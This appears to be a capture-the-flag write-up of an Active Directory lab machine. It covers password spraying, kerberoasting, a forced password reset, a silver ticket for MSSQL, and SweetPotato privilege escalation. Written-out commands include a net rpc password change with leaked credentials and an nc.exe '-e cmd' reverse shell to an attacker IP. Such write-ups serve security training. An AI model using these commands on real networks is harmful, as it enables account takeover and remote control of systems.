### 80/TCP - HTTP

![](../../../assets/dd244477f492744872dbba9b503185e1.png)

We then check the `/Team` tab and notice an absolutely enormous list of possible users.

![](../../../assets/a7f8a1093494224d927dd55e0fa35046.png)

Furthermore I only found one more endpoint:

![](../../../assets/cfddab30d48407dee927d2de6ea1ef38.png)

### Making Wordlists

Either way I went ahead and put all the team members inside a `team.txt` file, then used `username-anarchy` to create potential usernames out of it, after which I used `kerbrute` to verify the existing usernames on the domain:

![](../../../assets/7ffacd9fe5139fa44434a9e65bfc34b6.png)

I then used the following command to overwrite my original `users.txt` file with only the valid accounts:

![](../../../assets/baaf09a7fd81da93795c82db8c8efe61.png)

Now that we have a wordlist of usernames we need to make a wordlist of passwords, only natural right?

:::note
Yeah not gonna lie I was never gonna guess this one but [this walkthrough helped me](https://medium.com/@carlosbudiman/oscp-proving-grounds-nagoya-hard-active-directory-bd548b5a740d):
![](../../../assets/3a3155f6f75c7949d38f9d75b7ae7e6f.png)
:::

![](../../../assets/1d30913ecbf0d5a9998ec4acb4f5e412.png)

Guess that's some *REAL* outside of the box thinking here.

## Password Spraying

Now that we had a set of matching creds we could go ahead and start spraying the creds to see what's up.

![](../../../assets/a4acb0c8b678a7899def2a0433bf0db1.png)

Well that settles that let's check out the SMB shares as well as RDP in.

### 445/TCP - SMB

![](../../../assets/6159760e0ab76d84202f7623336219bc.png)

![](../../../assets/3d0776edbcc9c0cbdf492776c2208e80.png)

I ended up getting them all and checking them out.

![](../../../assets/a68c8e68e0bc02a845c3a3f16e2c514a.png)

### Reverse Engineering

Obviously we aren't able to read the other files using `cat` since they're `.exe` and `.dll` files, so instead we use the `strings` command:

![](../../../assets/0652931b6dd773d3bb8e9bc9edec8c4c.png)

Well look at that we found another user!

```
svc_helpdesk
U299iYRmikYTHDbPbxPoYYfa2j4x4cdg
```

## Kerberoasting

I now had another valid set of creds so I could kerberoast sine creds:

![](../../../assets/69bc61a1d6c72b54116f3b41a60c6c1c.png)

From this I was able to gather the `svc_mssql` user.

We can now go on to crack the hashes using `john`:

![](../../../assets/30e38a672c3723b4befe9bb75c4cd7ae.png)

```
svc_mssql
Service1
```

## BloodHound
### Set Up

![](../../../assets/d31ff02b802aba12c4990802b6aa945c.png)

I use the above and find a bunch of data which I can now ingest in my browser:

![](../../../assets/61210569023adcd73616579ea4045f60.png)

Once ingested I go ahead and get everything organized, let's see who we need to reach and how.

![](../../../assets/0aa53ddb8c68b7120bc5cc20918ee91a.png)

From here we see only one user that has access to interesting groups:

![](../../../assets/66c61e968258e23c31fe70102f28dee3.png)

I check out the options of abuse here:

![](../../../assets/1ce8fdada3f84af53b94f2f930981f82.png)

I end up choosing the **Force Change Password** method and see if it hopefully works:

```bash
net rpc password "christopher.lewis" "Pass@123" -U 'nagoya-industries.com'/'svc_helpdesk'%"U299iYRmikYTHDbPbxPoYYfa2j4x4cdg" -S "192.168.169.21"
```

![](../../../assets/508c4be68e649a67e334e92b17b98844.png)

:::success
Well shit it seemed to work!
:::

## Foothold
### Shell as Christopher

![](../../../assets/8673dffd8e64c9166f352cb4e892440f.png)

We now finally had access and could start the rest of our enumeration process.

![](../../../assets/079e2a8b7bbfb732d7c850a444523d39.png)

Shit.

### local.txt

![](../../../assets/369620d4deef78ddcdb73e212eb48f43.png)

That's a first? 

:::caution
It was here that I was getting stuck because I didn't know what to do next, I tried the `mssql` RCE approach but that didn't work.
:::

## Silver Ticket

:::note
Since I've never done this before I heavily checked a walkthrough here.
:::

The premise would look like this:

![](../../../assets/3dbbae0b2dfca4015dd6b88624882998.png)

To do this we need the following:

- SPN password hash,  
- Domain SID,  
- and Target SPN of the service account youâ€™ve compromised

### Domain SID

![](../../../assets/69eb8eb24cd9fe7591cf6044390d5346.png)

```
S-1-5-21-1969309164-1513403977-1686805993
```

### SPN Password Hash

![](../../../assets/5bd45133e65aff4543d5b9e0a951a2fa.png)

```
E3A0168BC21CFB88B95C954A5B18F57C
```

### Target SPN service account

![](../../../assets/b3ce261da0dd3f99af044b4bafa88f3f.png)

```
MSSQL/nagoya.nagoya-industries.com
```

### Putting it all Together

![](../../../assets/46e3f18348a474ef2bfa13efa3b36d7c.png)

We check if it is stashed correctly using `klist`:

![](../../../assets/49f6667ae25ec1649d799525853e3f0b.png)

We will then issue the following command:

```bash
export KRB5CCNAME=$PWD/Administrator.ccache
```

And now create this file:

```bash
# /etc/krb5user.conf
[libdefaults]
        default_realm = NAGOYA-INDUSTRIES.COM
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
    rdns = false
    dns_canonicalize_hostname = false
        fcc-mit-ticketflags = true

[realms]
        NAGOYA-INDUSTRIES.COM = {
                kdc = nagoya.nagoya-industries.com
        }

[domain_realm]
        .nagoya-industries.com = NAGOYA-INDUSTRIES.COM
```

![](../../../assets/ffbe6517ba035c82dfc244d5d392ac21.png)

Once that is done we can move on to port forwarding and gaining access via `mssql`.

## Port Forward

This is the easy part:

![](../../../assets/b33a9c2b38ee5dcaec11e47cf7386f20.png)

![](../../../assets/502509fae5a9f25a133b3f5e2607929e.png)

![](../../../assets/8d5b7e3f7ca982f8c6c28c43c91cc897.png)

Once we've set all the above we can access the `mssql` client via the port forward IP `240.0.0.1`:

## MSSQL

In order to gain access as *Admin* to the port forwarded `mssql` client we need to add the host to `/etc/hosts`:

![](../../../assets/71419386374b11c5d1c710f076393099.png)

Now we can access it on the port forward address.

![](../../../assets/088f0e2123602f8cd9c4288f987ac04c.png)

:::important
Be sure to access it via the same terminal window where you cached the ticket!
:::

![](../../../assets/3780b558bf3774885074db97bbbf23a9.png)

And now we can execute arbitrary commands such as a reverse shell!

![](../../../assets/c478212cb26323b55979e1629a39eda9.png)

## Privilege Escalation
### SeImpersonatePrivilege

This was pretty simple (at last):

![](../../../assets/7a10d7fa87471487afad3e28a6b8fc15.png)

We just need to spam potatoes until one of em works.

I used `SweetPotato` here with the following command using `nc.exe`:

```bash
./sweet.exe -p PrintSpoofer -p nc.exe -a '192.168.45.154 8000 -e cmd'
```

![](../../../assets/44bfa15ce5ed0ddf101538c1b0893e58.png)

![](../../../assets/16830d97bc55eaab9f4b7b2be20aba3a.png)

From here it was piece of cake
